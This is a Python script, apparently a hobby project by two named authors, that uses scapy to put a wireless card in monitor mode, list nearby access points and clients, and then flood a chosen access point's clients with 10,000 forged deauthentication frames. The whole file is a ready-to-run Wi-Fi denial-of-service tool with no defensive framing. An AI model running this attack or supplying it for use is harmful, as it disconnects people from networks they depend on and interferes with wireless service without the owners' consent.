import os
from scapy.all import *

devices = {}
clients = {}

def Welcome():
	print("Welcome to Deauth script v1.0")
	print("Developed by Sagi Saada and Shlomi Domennko")

def MonitorMode(interface):
	os.system("bash Monitor.sh "+interface)
	print(interface+" mode changed to Monitor\n")

def DeauthAttack(interface, target):
	brdmac = "ff:ff:ff:ff:ff:ff"
	pkt = RadioTap() / Dot11( addr1 = brdmac, addr2 = target, addr3 = target) / Dot11Deauth()
	sendp(pkt, iface = interface, count = 10000, inter = .2)

def Display_Devices_Clients():
	os.system("clear")
	print ("-------- Devices Table --------\n")
	print ("---- ESSID -------- MAC Address ----\n")
	for device in devices:
		print (device +" \t " + devices[device])
	print ("-----------------------------------\n")

	print ("-------- Clients Table --------\n")
	print ("---- BSSID -------- Mac Address ----\n")

	for client in clients:
		print (client +" \t "+ clients[client])
	print ("-----------------------------------\n")
	
	print ("Press [Ctrl+C] to stop.")

def Display_Devices():
	count = 1
	print("\n")
	for device in devices:
		print (""+str(count)+". "+device +"\t"+devices[device])
		count += 1
		
def PacketHandler(pkt):
	try:
		flag = 0
		if(pkt.haslayer(Dot11Beacon)):
			if(pkt.addr2 not in devices.values()):
				devices[pkt.info] = pkt.addr2
				flag = 1
				
		if(pkt.haslayer(Dot11ProbeReq)):
			if len(pkt.info) > 0:
				if(pkt.addr2 not in clients.values()):
					clients[pkt.info] = pkt.addr2
					if(devices):
						flag = 1
		if(flag):
			Display_Devices_Clients()

	except KeyboardInterrupt:
		print ("\nInterruption detected.\n")

def Device_Interface():
	choise  = raw_input("\nSelect an interface to work with (leave blank for wlan0):")
	if(choise == ""):
		return "wlan0"
		
	else:
		return choise

	print("\nYour interface device is "+interface+"\n")

def Exit():
	print("Exiting Death script v1.0 - See you soon!")
	sys.exit(0)

def Interface():
	try:
		Welcome()
		interface = Device_Interface()
		
		choise = raw_input("Put "+interface+" in monitor mode? Y/n (leave blank for Y):")

		if(choise == "y" or choise == "Y" or choise == ""):
			MonitorMode(interface)
			
		choise = raw_input("Start to scan? Y/n (leave blank for Y):")
		
		if(choise == "y" or choise == "Y" or choise == ""):
			print("Starting check for Devices and Clients\n")
			sniff(iface = interface, prn = PacketHandler)
			
		flag = 1
		if(devices):
			Display_Devices()
			while(flag):
				choise = raw_input("\nPlease choose MAC Address (For example: 00:18:25:16:72:b0):")	
				if(choise == "exit" or choise == "quit"):
					Exit()
					
				if(choise not in devices.values()):
					print("Bad MAC Address")

				else:
					DeauthAttack(interface, choise)
					flag = 0
		else:
			print("Devices Table is null\n")

		Exit()

	except KeyboardInterrupt:
		print ("\nInterruption detected.\n")
		Exit()

if __name__ == '__main__':
	Interface()